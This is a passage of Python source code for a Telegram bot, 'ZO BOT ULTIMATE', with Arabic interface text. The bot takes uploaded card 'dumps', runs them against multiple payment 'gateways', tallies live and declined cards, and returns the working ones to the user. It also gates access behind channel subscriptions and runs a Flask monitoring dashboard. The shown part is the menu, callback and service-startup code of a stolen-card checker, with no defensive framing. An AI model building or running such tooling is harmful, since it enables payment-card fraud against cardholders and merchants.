<b>🎉 تم التحقق من اشتراكك في جميع القنوات</b>
<b>🚀 يمكنك الآن استخدام البوت بكامل مميزاته</b>

<b>📥 أرسل كروتك الآن للبدء</b>
"""
            bot.edit_message_text(
                success_msg,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML',
                reply_markup=create_main_menu()
            )
        bot.answer_callback_query(call.id, "تم التحقق من الاشتراك")
        return
    
    not_subscribed = check_subscription(user_id)
    if not_subscribed:
        bot.answer_callback_query(call.id, "يجب الاشتراك في القنوات أولاً!", show_alert=True)
        return
    
    with memory_lock:
        dumps = user_dumps.get(user_id, [])
        session = user_sessions.get(user_id, {})
    
    if call.data == "start_check":
        if not dumps:
            bot.answer_callback_query(call.id, "❌ No cards loaded!", show_alert=True)
            return
        
        if session.get('is_checking', False):
            bot.answer_callback_query(call.id, "⚠️ Check already in progress!", show_alert=True)
            return
        
        Thread(target=run_check_process, args=(user_id, chat_id, message_id), daemon=True).start()
        bot.answer_callback_query(call.id, "🚀 Starting check...")
    
    elif call.data == "stop_check":
        with memory_lock:
            if user_id in user_sessions:
                user_sessions[user_id]['stop_requested'] = True
        
        bot.answer_callback_query(call.id, "🛑 Stop requested!")
        
        with memory_lock:
            live_cards = user_live_cards.get(user_id, [])
        
        if live_cards:
            username = session.get('username', '')
            send_live_cards_auto(user_id, chat_id, live_cards, username)
        
        bot.edit_message_text(
            f"<b>🛑 Check Stopped</b>\n\n<b>Checked:</b> {session.get('checked', 0)}/{len(dumps)}\n<b>✅ Live:</b> {session.get('live', 0)}",
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_check_buttons(),
            parse_mode='HTML'
        )
    
    elif call.data == "show_stats":
        stats_text = f"""
<b>📊 Current Stats</b>
────────────────────
<b>Total Cards:</b> {len(dumps)}
<b>Checked:</b> {session.get('checked', 0)}
<b>✅ Live:</b> {session.get('live', 0)}
<b>💬 Declined:</b> {session.get('declined', 0)}
<b>Progress:</b> {session.get('checked', 0)}/{len(dumps)}
────────────────────
"""
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            stats_text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_check_buttons(),
            parse_mode='HTML'
        )
    
    elif call.data == "show_live":
        with memory_lock:
            live_cards = user_live_cards.get(user_id, [])
        
        if not live_cards:
            bot.answer_callback_query(call.id, "No live cards yet!", show_alert=True)
            return
        
        username = session.get('username', '')
        send_live_cards_auto(user_id, chat_id, live_cards, username)
        bot.answer_callback_query(call.id, "✅ Live cards sent!")
    
    elif call.data == "save_results":
        with memory_lock:
            live_cards = user_live_cards.get(user_id, [])
        
        if not live_cards:
            bot.answer_callback_query(call.id, "No results to save!", show_alert=True)
            return
        
        username = session.get('username', '')
        send_live_cards_auto(user_id, chat_id, live_cards, username)
        bot.answer_callback_query(call.id, "✅ Results saved and sent!")
    
    elif call.data == "new_check":
        with memory_lock:
            if user_id in user_sessions:
                user_sessions[user_id] = {
                    'total_cards': len(dumps),
                    'checked': 0,
                    'live': 0,
                    'declined': 0,
                    'start_time': datetime.now(),
                    'is_checking': False,
                    'username': session.get('username', '')
                }
        
        new_msg = f"""
<b>🆕 New Check Ready</b>

<b>📦 Cards:</b> {len(dumps)}
<b>🌐 Gateways:</b> {len(GATEWAYS)}
<b>👤 User:</b> {call.from_user.first_name}

<b>Click 🚀 Start Check to begin</b>
"""
        bot.edit_message_text(
            new_msg,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_check_buttons(),
            parse_mode='HTML'
        )
        bot.answer_callback_query(call.id, "🆕 New check ready!")

@bot.message_handler(func=lambda message: message.text in ["🔍 Check Cards", "⚡ Quick Check", "📊 Statistics", "🌐 Gateways", "🧹 Clear", "❓ Help"])
def handle_menu_buttons(message):
    not_subscribed = check_subscription(message.from_user.id)
    
    if not_subscribed:
        subscription_msg = f"""
<b>❌ اشتراك مطلوب!</b>

يجب الاشتراك في القنوات التالية:

{chr(10).join([f'• @{channel["username"]}' for channel in not_subscribed])}
"""
        bot.send_message(
            message.chat.id,
            subscription_msg,
            parse_mode='HTML',
            reply_markup=create_subscription_markup()
        )
        return
    
    if message.text == "🔍 Check Cards":
        check_command(message)
    elif message.text == "⚡ Quick Check":
        quick_check_command(message)
    elif message.text == "📊 Statistics":
        stats_command(message)
    elif message.text == "🌐 Gateways":
        gateways_command(message)
    elif message.text == "🧹 Clear":
        clear_command(message)
    elif message.text == "❓ Help":
        send_welcome(message)

# ============================================
# 🚀 تشغيل النظام
# ============================================

def cleanup_memory():
    """تنظيف الذاكرة التلقائي"""
    current_time = datetime.now()
    
    with memory_lock:
        users_to_remove = []
        for user_id, session in user_sessions.items():
            if 'last_update' in session:
                if (current_time - session['last_update']).total_seconds() > 3600:
                    users_to_remove.append(user_id)
        
        for user_id in users_to_remove:
            if user_id in user_dumps:
                del user_dumps[user_id]
            if user_id in user_sessions:
                del user_sessions[user_id]
            if user_id in user_live_cards:
                del user_live_cards[user_id]
            if user_id in user_check_processes:
                del user_check_processes[user_id]
        
        cache_to_remove = []
        for key, (cache_time, _) in gateway_cache.items():
            if (current_time - cache_time).total_seconds() > CACHE_DURATION:
                cache_to_remove.append(key)
        
        for key in cache_to_remove:
            del gateway_cache[key]
    
    logger.info(f"🧹 Memory cleanup completed. Removed {len(users_to_remove)} users, {len(cache_to_remove)} cache entries")

def start_cleanup_scheduler():
    """بدء جدول التنظيف التلقائي"""
    schedule.every(30).minutes.do(cleanup_memory)
    
    while True:
        schedule.run_pending()
        time.sleep(60)

def run_bot():
    """تشغيل البوت"""
    logger.info("🤖 Starting Telegram Bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=30)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            logger.error(traceback.format_exc())
            time.sleep(5)

def run_flask():
    """تشغيل خادم Flask"""
    logger.info("🌐 Starting Flask Server...")
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)

def main():
    """الدالة الرئيسية"""
    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║   🚀 ZO BOT ULTIMATE v10.0                         ║
    ║   Complete System with Full Monitoring             ║
    ║   Flask Dashboard: ✅ ENABLED                     ║
    ║   Real-time Stats: ✅ ENABLED                     ║
    ║   Auto Cleanup: ✅ ENABLED                        ║
    ║   Max Concurrent: {MAX_CONCURRENT_CHECKS:3}                            ║
    ║   Creator: Alpha | @NAPGF                         ║
    ╚══════════════════════════════════════════════════════╝
    
    📡 System Features:
    • Complete Web Dashboard: http://0.0.0.0:8080
    • Real-time System Monitoring
    • Auto Memory Cleanup (every 30 minutes)
    • Performance Metrics Collection
    • Log Management System
    
    🚀 Performance:
    • Concurrent Checks: {MAX_CONCURRENT_CHECKS}
    • Worker Threads: {MAX_THREADS}
    • Request Timeout: {REQUEST_TIMEOUT}s
    • Cache Duration: {CACHE_DURATION}s
    
    🌐 Available Routes:
    • /              - Dashboard Home
    • /status        - System Status API
    • /health        - Health Check
    • /stats         - Full Statistics
    • /cleanup       - Memory Cleanup
    • /logs          - Log Viewer
    • /gateways      - Gateway List
    
    📊 Bot Features:
    • {len(GATEWAYS)} Active Gateways
    • Auto-send Live Cards
    • Subscription Check
    • Progress Tracking
    • File Support
    
    ⚠️ Important: 
    • System will auto-recover from crashes
    • Memory auto-cleanup every 30 minutes
    • All logs saved to bot_log.log
    
    🚦 Starting all services...
    """)
    
    # بدء خدمة التنظيف
    cleanup_thread = Thread(target=start_cleanup_scheduler, daemon=True)
    cleanup_thread.start()
    
    # بدء البوت
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # بدء Flask في الخيط الرئيسي
    run_flask()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("👋 Shutting down gracefully...")
        thread_pool.shutdown(wait=True)
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        logger.error(traceback.format_exc())
        sys.exit(1)